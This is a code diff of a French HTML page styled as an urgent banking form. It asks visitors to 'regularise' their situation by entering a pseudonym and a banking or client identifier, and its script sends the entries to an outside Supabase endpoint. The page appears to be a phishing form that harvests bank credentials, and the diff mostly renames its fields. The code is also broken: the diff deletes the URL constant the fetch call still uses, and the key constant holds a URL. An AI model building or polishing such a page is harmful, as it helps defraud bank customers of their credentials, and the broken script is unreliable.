@@ -73,7 +73,7 @@ input {
 <body>
 <div class="alerte">
   <h1>🚨 FORMULAIRE bancaire 🚨</h1>
-  <h2>Enregistrement du client</h2>
+  <h2>Enregistrement du clients</h2>
 
   <p>
     En confirmant, tu regularise ta situation , ton identifiant
@@ -84,22 +84,22 @@ input {
     <input
       type="text"
       name="pseudo"
-      placeholder="Pseudo du client"
+      placeholder="Pseudo du clients"
       maxlength="50"
       required
     >
 
     <input
       type="text"
-      name="identifiant_bancaire"
-      placeholder="Identifiant bancaire"
+      name="identifiant_clients"
+      placeholder="Identifiant clients"
       maxlength="100"
       required
     >
 
     <input
       type="number"
-      name="client"
+      name="clients"
       placeholder="Score"
       min="0"
       required
@@ -114,9 +114,6 @@ input {
 </div>
 
 <script>
-const SUPABASE_URL =
-  "https://jjtwodgevtkltqovargh.supabase.co";
-
 const SUPABASE_KEY =
   "https://jjtwodgevtkltqovargh.supabase.co";
 
@@ -138,7 +135,7 @@ formulaire.addEventListener("submit", async function(event) {
 
   try {
     const reponse = await fetch(
-      `${SUPABASE_URL}/rest/v1/client`,
+      `${SUPABASE_URL}/rest/v1/clients`,
       {
         method: "POST",
         headers: {
